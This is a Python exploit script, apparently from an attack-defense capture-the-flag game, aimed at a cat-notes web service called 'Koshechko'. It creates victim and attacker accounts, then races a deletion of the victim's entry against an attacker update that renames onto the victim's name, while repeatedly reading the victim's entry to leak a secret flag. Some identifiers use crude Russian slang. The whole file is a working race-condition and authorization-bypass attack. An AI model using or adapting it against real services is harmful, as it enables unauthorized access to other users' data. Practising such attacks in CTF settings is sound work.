import asyncio
import aiohttp

import api
import sys
import time

from generators import *

SECRET_TEXT = 'sosal_gubami'

VICTIM_LOGIN = 'hello'
VICTIM_PASSWORD = 'world'
VICTIM_CAT_NAME = 'barsiq' + random_string(6)

ATTACKER_LOGIN = 'ano'
ATTACKER_PASSWORD = 'nimus'
ATTACKER_CAT_NAME = 'ryzhik'
ATTACKER_CAT_RENAME = 'neryzhik'
ATTACKER_TEXT = 'blank'
ATTACKER_NEW_TEXT = 'blanc'



async def prepare(session, client: api.KoshechkoClient, login, password, cat_name, text):
    await client.register(session, login, password)

    token = await client.login(session, login, password)

    session.headers.update({"token": token})            

    await client.kosh_create(session, cat_name, text, [login])
    return token


async def droch_gubami(attack_ses, client):
    i = 10
    res = []
    while i:
        try:
            resp = await client.kosh_view(attack_ses, VICTIM_CAT_NAME)
            i -= 1
            print("got flag" + resp.text)
        except api.ErrorCode:
            print("error")

    return res

async def deleam_gubami(attack_ses, victim_ses, client):
    await client.kosh_delete(victim_ses, VICTIM_CAT_NAME),
    try:
        pass
        await client.kosh_update(attack_ses, ATTACKER_CAT_NAME, VICTIM_CAT_NAME, ATTACKER_NEW_TEXT, [])
        # await client.kosh_update(attack_ses, ATTACKER_CAT_NAME, ATTACKER_CAT_NAME, ATTACKER_NEW_TEXT, [])
    except:
        pass

async def main():
    async with aiohttp.ClientSession() as prepare_ses:
        async with aiohttp.ClientSession() as attack_ses:
            host = sys.argv[1]
            client = api.KoshechkoClient(host, api.SERVICE_PORT)
            pt = await prepare(prepare_ses, client, VICTIM_LOGIN, VICTIM_PASSWORD, VICTIM_CAT_NAME, SECRET_TEXT)
            # print(pt)
            attacker_token = await prepare(attack_ses, client, ATTACKER_LOGIN, ATTACKER_PASSWORD, ATTACKER_CAT_NAME, ATTACKER_TEXT)

            time.sleep(2)
            # print(attacker_token)
            results = await asyncio.gather(
                droch_gubami(attack_ses, client),
                deleam_gubami(attack_ses, prepare_ses, client)
            )
            res = await client.kosh_view(attack_ses, VICTIM_CAT_NAME)
            print(res)


loop = asyncio.get_event_loop()
try:
    loop.run_until_complete(main())
    loop.run_until_complete(loop.shutdown_asyncgens())
finally:
    loop.close()
